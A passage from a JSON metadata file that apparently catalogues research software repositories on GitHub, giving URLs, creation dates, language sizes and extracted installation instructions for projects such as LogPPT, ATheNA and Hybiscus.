                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "253": {
        "filename": "LogIntelligence_LogADEmpirical_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LogIntelligence/LogADEmpirical",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-10T08:35:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T14:52:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 472716
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "254": {
        "filename": "NWU-NISL-Fuzzing_COMFORT_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NWU-NISL-Fuzzing/COMFORT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-27T13:47:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-29T08:57:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 13420407
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 10160257
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 354701
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 302267
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "VBScript",
                    "name": "VBScript",
                    "type": "Programming_language",
                    "size": 1186
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 899
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "255": {
        "filename": "SOM-Research_OSSFoundations_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SOM-Research/OSSFoundations",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We would also invite you to report any fix or request via the tradicional GitHub issue mechanism. \n \n",
                    "original_header": "\ud83d\udee0\ufe0f Under development"
                },
                "confidence": 0.9985185330447724,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SOM-Research/OSSFoundations/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-26T10:39:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-28T11:27:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 98240
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 35974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 548
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "256": {
        "filename": "ATheNA-SBST_ATheNA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ATheNA-SBST/ATheNA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install the toolbox, clone this repository to the intended system and add all folders to the MATLAB path. Then,\nfollow all the requirements and instructions listed in [_System Requirements_](#system-requirements) and [_Setting Up\nS-TaLiRo for ATheNA Usage_](#setting-up-s-taliro-for-athena-usage).\n\nA step-by-step installation guide is also available on [YouTube](https://www.youtube.com/watch?v=F8hhTQ8nLts)\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "ATheNA"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ATheNA-SBST/ATheNA/main/README.md"
            },
            {
                "result": {
                    "value": "ATheNA modifies some contents of the S-TaLiRo toolbox for it to run. Before a _staliro_ folder can be used for\nthe first time, it must be configured correctly. To configure the folder correctly, follow the steps below:\n\n1. Download S-Taliro from its [repository](https://app.assembla.com/spaces/s-taliro_public/subversion/source/HEAD/trunk).\n\n2. Unzip the folder, rename it to `staliro` (Optional), and move it inside the ATheNA repo.\n\n3. Ensure that the correct MEX compiler for your operating system is connected to MATLAB by referring to the online MATLAB [documentation](https://www.mathworks.com/support/requirements/supported-compilers.html).\n\n4. Ensure that the ATheNA toolbox folder and its subfolders are added to the MATLAB path.\n\n5. Run the `configureAthena` function by providing the relative path from the current working directory to the S-Taliro folder.\n   For example, if the current working directory is the ATheNA repository cloned from GitHub and the folder containing S-Taliro has been renamed to `staliro`, then the command is the following:\n\n```matlab\nconfigureAthena('staliro')\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting Up S-TaLiRo for ATheNA Usage",
                    "parent_header": [
                        "ATheNA",
                        "System Requirements"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ATheNA-SBST/ATheNA/main/README.md"
            },
            {
                "result": {
                    "value": "A manual fitness function is required for ATheNA to work properly. The function must be added to the MATLAB path. The\nfunction **MUST** take 3 arguments as these are passed to the function internally by ATheNA:\n\n* `t`: column vector with the timestamps for the model input and output spanning the specified simulation time.\n* `u`: the input generated for the current iteration. If the `athena_options.useInterpInput` property is set to `true`,\n  then this is a matrix where the $i$-th column corresponds to the interpolated values for the $i$-th input port and the\n  rows correspond to the timestamps in `t`. Otherwise, a column vector of the control point values is provided with the\n  control points for each input port being placed consecutively. For example, if the first input port has 7 control\n  points, and the second input port has 3 control points, then `u(1:7,1)` would contain the control points for the first\n  port in order, and `u(8:10,1)` would contain the control points for the second input port in order.\n* `y`: matrix containing the output generated by the model, where the $i$-th column corresponds to the $i$-th output\n  port, and the rows correspond to timestamps in `t`.\n\n**Note**: <u>users can also invoke and use global variables inside of fitness functions</u>.\n\nThe function declaration should resemble the following structure:\n\n```matlab\nfunction fitness = myFitnessFunction(t,u,y)\n% The manual fitness function calculation proceeds,\n% and can differ from the following line\nfitness = 1;\nend\n```\n\nThe function should output a fitness value in the range $[-1,1]$, where -1 is the most desirable fitness. For more\ninformation on creating manual fitness functions refer to the MATLAB `help` function documentation by\ncalling `help createManualFitness`.\n\nIn order for ATheNA to correctly identify the function, it must be a valid MATLAB function added to the MATLAB path, and\nthe `athena_options.fitnessFcn` property must be set to the name of function as a string or character vector if the\nfitness function is a main function, or as a function handle if it is a local or nested function. For example, if the\nfunction is called myFitnessFunction, set the property as follows:\n\n```matlab\n% Ensure that 'athena_opt' has been initialized as an athena_options object.\n% Any valid variable name can be used for the athena_options instance.\n\n% If the function is a main function\nathena_opt.fitnessFcn = 'myFitnessFunction';\n\n% If the function is a local or nested function\nathena_opt.fitnessFcn = @myFitnessFunction;\n```\n\nEven if an ATheNA test is set to use automatic fitness only, a fitness function must be defined. In such a case, the\ndefault value of `athena_options.fitnessFcn` can be used. Documentation regarding the `athena_options.fitnessFcn`\nproperty and its default value can be accessed through the following `help` function call:\n\n```matlab\nhelp athena_options.fitnessFcn\n```\n\nSee the [_Examples_](#examples) section below for instructions on how to access an applied example of a fitness\nfunction.\n",
                    "type": "Text_excerpt",
                    "original_header": "Creating Manual Fitness Functions",
                    "parent_header": [
                        "ATheNA",
                        "Manual Fitness Functions"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ATheNA-SBST/ATheNA/main/README.md"
            },
            {
                "result": {
                    "value": "The Manual and Automatic Fitness values are combined linearly by default using the `athena\\_options.coeffRob` property.\nThis weight must be a value in the range $[0, 1]$, where 0\nsignifies using the manual fitness only, and 1 signifies using the automatic fitness only. Any value\nof `athena_options.coeffRob` inside the range corresponds to a value $p$ used to calculate the combined fitness\n$f_{athena}$ with the weighted average formula below:\n\n$$f_{athena} = f_{automatic} \\cdot p + f_{manual} \\cdot (1 - p)$$\n\nThe user can define their own implementation of the `athenaFitness` method, by modifying the function `./src/UpdateStaliro/Compute \\_Robustness.m` at line 147.\n\nThe atomic predicates used during the test should also be normalized with their normalization bounds defined. The bound\nof an atomic predicate is the highest magnitude robustness value that is possible for that predicate, or a reasonable\napproximation of that value. Formally, if the robustness interval for some predicate is found to be within $[a, b]$,\nthen the bound would be $\\max(|a|,|b|)$. If the robustness interval is unknown, then the magnitude of the\ndifference of the input range can be used. Formally, if the input range is $[c, d]$, then the bound would be \n$|d - c|$.\n\n**Note**: The atomic predicates are stored in the `preds` struct that is passed into the `athena` function. Refer to the\n`help` documentation regarding the `athena` function using `help athena` for more information on this structure.\n\nTo normalize the atomic predicate at index $i$ of a predicates struct `preds`:\n\n```matlab\npreds(i).Normalized = true;\n```\n\nTo set the normalization bounds of the atomic predicate at index $i$ of a predicates struct `preds` to some value $k$:\n\n```matlab\npreds(i).NormBounds = k;\n```\n\nTo access the `help` function documentation pertaining to the `athena_options.coeffRob` property, run the following or\nenter it to the MATLAB Command Window:\n\n```matlab\nhelp athena_options.coeffRob\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Combining Manual and Automatic Fitness Values",
                    "parent_header": [
                        "ATheNA",
                        "Manual Fitness Functions"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ATheNA-SBST/ATheNA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-21T20:03:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-11T21:57:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 350060
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 152896
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "257": {
        "filename": "swatlab_stack_overflow_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/swatlab/stack_overflow",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-10-20T02:51:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-10-08T15:29:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2434181
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "258": {
        "filename": "LogIntelligence_LogPPT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LogIntelligence/LogPPT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Raw logs                                                                                                                                         | Events                                                                                    |\n|:-------------------------------------------------------------------------------------------------------------------------------------------------|:------------------------------------------------------------------------------------------|\n| TEST 9/13884 \\[2/2 concurrent test workers running\\]                                                                                             | TEST <\\*> \\[<\\*> concurrent test workers running\\]                                        |\n| (1.039 s) Test touch() function : basic functionality \\[ext/standard/tests/file/touch_basic.phpt\\]                                               | <\\*> Test touch() function : basic functionality <*>                                      |\n| (120.099 s) Bug #60120 (proc_open hangs when data in stdin/out/err is getting larger or equal to 2048) \\[ext/standard/tests/file/bug60120.phpt\\] | <\\*> Bug <\\*> (proc_open hangs when data in <\\*> is getting larger or equal to <\\*>) <\\*> |\n| SKIP Bug #54977 UTF-8 files and folder are not shown \\[ext/standard/tests/file/windows_mb_path/bug54977.phpt\\] reason: windows only test         | SKIP Bug <\\*> UTF-8 files and folder are not shown <\\*> reason: windows only test         |\n| Exts skipped    :   17                                                                                                                           | Exts skipped : <*>                                                                        | \n",
                    "original_header": "Parsing results with <a href=\"logs/BuildLog/example.log\">Build Log</a> from <a href=\"https://zenodo.org/record/3632351\">LogChunks</a>"
                },
                "confidence": 0.9999627853394647,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LogIntelligence/LogPPT/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-01T00:50:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T08:17:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 104691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 4099
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1656
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "259": {
        "filename": "ShamerD_source-code-efficient-ft_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ShamerD/source-code-efficient-ft",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "<!---\nCopyright 2020 The HuggingFace Team. All rights reserved.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n-->\n\n# Installation\n\n\ud83e\udd17 Transformers is tested on Python 3.6+, and PyTorch 1.1.0+ or TensorFlow 2.0+.\n\nYou should install \ud83e\udd17 Transformers in a [virtual environment](https://docs.python.org/3/library/venv.html). If you're\nunfamiliar with Python virtual environments, check out the [user guide](https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/). Create a virtual environment with the version of Python you're going\nto use and activate it.\n\nNow, if you want to use \ud83e\udd17 Transformers, you can install it with pip. If you'd like to play with the examples, you\nmust install it from source.\n\n## Installation with pip\n\nFirst you need to install one of, or both, TensorFlow 2.0 and PyTorch.\nPlease refer to [TensorFlow installation page](https://www.tensorflow.org/install/pip#tensorflow-2.0-rc-is-available),\n[PyTorch installation page](https://pytorch.org/get-started/locally/#start-locally) and/or\n[Flax installation page](https://github.com/google/flax#quick-install)\nregarding the specific install command for your platform.\n\nWhen TensorFlow 2.0 and/or PyTorch has been installed, \ud83e\udd17 Transformers can be installed using pip as follows:\n\n```bash\npip install transformers\n```\n\nAlternatively, for CPU-support only, you can install \ud83e\udd17 Transformers and PyTorch in one line with:\n\n```bash\npip install transformers[torch]\n```\n\nor \ud83e\udd17 Transformers and TensorFlow 2.0 in one line with:\n\n```bash\npip install transformers[tf-cpu]\n```\n\nor \ud83e\udd17 Transformers and Flax in one line with:\n\n```bash\npip install transformers[flax]\n```\n\nTo check \ud83e\udd17 Transformers is properly installed, run the following command:\n\n```bash\npython -c \"from transformers import pipeline; print(pipeline('sentiment-analysis')('we love you'))\"\n```\n\nIt should download a pretrained model then print something like\n\n```bash\n[{'label': 'POSITIVE', 'score': 0.9998704791069031}]\n```\n\n(Note that TensorFlow will print additional stuff before that last statement.)\n\n## Installing from source\n\nHere is how to quickly install `transformers` from source:\n\n```bash\npip install git+https://github.com/huggingface/transformers\n```\n\nNote that this will install not the latest released version, but the bleeding edge `master` version, which you may want to use in case a bug has been fixed since the last official release and a new release hasn't  been yet rolled out.\n\nWhile we strive to keep `master` operational at all times, if you notice some issues, they usually get fixed within a few hours or a day and and you're more than welcome to help us detect any problems by opening an [Issue](https://github.com/huggingface/transformers/issues) and this way, things will get fixed even sooner.\n\nAgain, you can run:\n\n```bash\npython -c \"from transformers import pipeline; print(pipeline('sentiment-analysis')('I hate you'))\"\n```\n\nto check \ud83e\udd17 Transformers is properly installed.\n\n## Editable install\n\nIf you want to constantly use the bleeding edge `master` version of the source code, or if you want to contribute to the library and need to test the changes in the code you're making, you will need an editable install. This is done by cloning the repository and installing with the following commands:\n\n``` bash\ngit clone https://github.com/huggingface/transformers.git\ncd transformers\npip install -e .\n```\n\nThis command performs a magical link between the folder you cloned the repository to and your python library paths, and it'll look inside this folder in addition to the normal library-wide paths. So if normally your python packages get installed into:\n```\n~/anaconda3/envs/main/lib/python3.7/site-packages/\n```\nnow this editable install will reside where you clone the folder to, e.g. `~/transformers/` and python will search it too.\n\nDo note that you have to keep that `transformers` folder around and not delete it to continue using the  `transfomers` library.\n\nNow, let's get to the real benefit of this installation approach. Say, you saw some new feature has been just committed into `master`. If you have already performed all the steps above, to update your transformers to include all the latest commits, all you need to do is to `cd` into that cloned repository folder and update the clone to the latest version:\n\n```\ncd ~/transformers/\ngit pull\n```\n\nThere is nothing else to do. Your python environment will find the bleeding edge version of `transformers` on the next run.\n\n\n## With conda\n\nSince Transformers version v4.0.0, we now have a conda channel: `huggingface`.\n\n\ud83e\udd17 Transformers can be installed using conda as follows:\n\n```\nconda install -c huggingface transformers\n```\n\nFollow the installation pages of TensorFlow, PyTorch or Flax to see how to install them with conda.\n\n## Caching models\n\nThis library provides pretrained models that will be downloaded and cached locally. Unless you specify a location with\n`cache_dir=...` when you use methods like `from_pretrained`, these models will automatically be downloaded in the\nfolder given by the shell environment variable ``TRANSFORMERS_CACHE``. The default value for it will be the Hugging\nFace cache home followed by ``/transformers/``. This is (by order of priority):\n\n  * shell environment variable ``HF_HOME``\n  * shell environment variable ``XDG_CACHE_HOME`` + ``/huggingface/``\n  * default: ``~/.cache/huggingface/``\n\nSo if you don't have any specific environment variable set, the cache directory will be at\n``~/.cache/huggingface/transformers/``.\n\n**Note:** If you have set a shell environment variable for one of the predecessors of this library\n(``PYTORCH_TRANSFORMERS_CACHE`` or ``PYTORCH_PRETRAINED_BERT_CACHE``), those will be used if there is no shell\nenvironment variable for ``TRANSFORMERS_CACHE``.\n\n### Note on model downloads (Continuous Integration or large-scale deployments)\n\nIf you expect to be downloading large volumes of models (more than 1,000) from our hosted bucket (for instance through\nyour CI setup, or a large-scale production deployment), please cache the model files on your end. It will be way\nfaster, and cheaper. Feel free to contact us privately if you need any help.\n\n### Offline mode\n\nIt's possible to run \ud83e\udd17 Transformers in a firewalled or a no-network environment.\n\nSetting environment variable `TRANSFORMERS_OFFLINE=1` will tell \ud83e\udd17 Transformers to use local files only and will not try to look things up.\n\nMost likely you may want to couple this with `HF_DATASETS_OFFLINE=1` that performs the same for \ud83e\udd17 Datasets if you're using the latter.\n\nHere is an example of how this can be used on a filesystem that is shared between a normally networked and a firewalled to the external world instances.\n\nOn the instance with the normal network run your program which will download and cache models (and optionally datasets if you use \ud83e\udd17 Datasets). For example:\n\n```\npython examples/seq2seq/run_translation.py --model_name_or_path t5-small --dataset_name wmt16 --dataset_config ro-en ...\n```\n\nand then with the same filesystem you can now run the same program on a firewalled instance:\n```\nHF_DATASETS_OFFLINE=1 TRANSFORMERS_OFFLINE=1 \\\npython examples/seq2seq/run_translation.py --model_name_or_path t5-small --dataset_name wmt16 --dataset_config ro-en ...\n```\nand it should succeed without any hanging waiting to timeout.\n\n\n\n## Do you want to run a Transformer model on a mobile device?\n\nYou should check out our [swift-coreml-transformers](https://github.com/huggingface/swift-coreml-transformers) repo.\n\nIt contains a set of tools to convert PyTorch or TensorFlow 2.0 trained Transformer models (currently contains `GPT-2`,\n`DistilGPT-2`, `BERT`, and `DistilBERT`) to CoreML models that run on iOS devices.\n\nAt some point in the future, you'll be able to seamlessly move from pretraining or fine-tuning models in PyTorch or\nTensorFlow 2.0 to productizing them in CoreML, or prototype a model or an app in CoreML then research its\nhyperparameters or architecture from PyTorch or TensorFlow 2.0. Super exciting!\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/ShamerD/source-code-efficient-ft/main/LoRA/examples/NLU/docs/source/installation.md"
            },
            {
                "result": {
                    "value": "```shell\n./setup.sh\n```\n\n`LoRA/examples/NLU` contains source code of Transformers library\n\nIn order to add new method/model you need to do the following:\n1. Modify Transformers' model code. See `LoRA/examples/NLU/src/transformers/models/plbart` for example.\n2. Modify running scripts to support added method/model. See `CodeT5/configs.py`, `CodeT5/run_gen.py`, `CodeT5/sh/run.py`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ShamerD/source-code-efficient-ft/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-30T19:29:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-18T01:45:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14486701
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 860445
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 223556
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 23065
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 7554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 7026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jsonnet",
                    "name": "Jsonnet",
                    "type": "Programming_language",
                    "size": 929
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "260": {
        "filename": "githru_githru_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/githru/githru",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\ngit clone https://github.com/githru/githru.git\ncd frontend\nnpm i\nnpm start\n```\n\nvisit \n- http://localhost:3000/v2/realm-java/v\n- http://localhost:3000/v2/vue\n",
                    "type": "Text_excerpt",
                    "original_header": "Install and Run",
                    "parent_header": [
                        "Githru"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/githru/githru/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-04T07:01:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T14:57:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 338211
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 6662
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1659
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "261": {
        "filename": "anonytomatous_Hybiscus_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/anonytomatous/Hybiscus",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To evaluate and compare the failure clustering performance of various clustering methods (Hybiscus, MSeer, ...), you need following data:\n\n1. A coverage data file (`.pkl`): A pickled pandas dataframe whose columns are test case IDs, and the indices are the program component IDs.\n    ```python\n    # Initialise data of coverage. \n    data = {\n        'T1':[1, 1, 0, 0, 1, 1],\n        'T2':[1, 1, 0, 0, 1, 1], \n        'T3':[0, 1, 1, 0, 1, 0], \n        'T4':[1, 0, 0, 1, 0, 0], \n        'T5':[0, 1, 0, 1, 1, 0], \n    } \n    \n    # Create and save pandas DataFrame.\n    df = pd.DataFrame(data, index =['C1', 'C2', 'C3', 'C4', 'C5', 'C6']) \n    df.to_pickle(\"resources/example/my_coverage.pkl\") # See resources/example/\n    print(df)\n    \"\"\"\n        T1  T2  T3  T4  T5\n    C1   1   1   0   1   0\n    C2   1   1   1   0   1\n    C3   0   0   1   0   0\n    C4   0   0   0   1   1\n    C5   1   1   1   0   1\n    C6   1   1   0   0   0\n    \"\"\"\n    ```\n2. (*ground-truth*) Files containing failing test cases for each fault (failing test cases should not be ovelapped.)\n   - ex) [./resources/example/fault-1-failing-tests](./resources/example/fault-1-failing-tests):\n        ```\n        T3\n        ```\n\n   - ex) [./resources/example/fault-2-failing-tests](./resources/example/fault-2-failing-tests):\n        ```\n        T4\n        T5\n        ```\n\n3. (*ground-truth*, optional) Files containing faulty components for each faults (to evaluate FL performance)\n   - ex) [./resources/example/fault-1-faulty-components](./resources/example/fault-1-faulty-components):\n        ```\n        C3\n        ```\n   - ex) [./resources/example/fault-2-faulty-components](./resources/example/fault-2-faulty-components):\n        ```\n        C4\n        ```\n",
                    "type": "Text_excerpt",
                    "original_header": "A. Prepare needed information",
                    "parent_header": [
                        "\ud83c\udf3a Hybiscus: Hypergraph-based Failure Clustering Framework",
                        "<a name=\"experiment\"></a> \ud83d\udd2c Evaluate the Failure Clustering &amp; Fault Localisation Performance"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/anonytomatous/Hybiscus/flattened/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- **If you want to construct a D4J multi-fault dataset, refer to https://github.com/anonytomatous/docker-D4J-multifault**\n- **If you want to construct a SIR multi-fault dataset, refer to https://github.com/anonytomatous/docker-SIR-multifault**\n \n",
                    "original_header": "B. Generate a Evaluation Dataset"
                },
                "confidence": 0.9999910666699049,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/anonytomatous/Hybiscus/flattened/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-25T07:47:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-23T02:55:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 57276
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 56780
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "262": {
        "filename": "fstiehle_SLR-blockchain-BP-execution_2024-10-03.json",
        "code_repository": [
            {
                "result": {
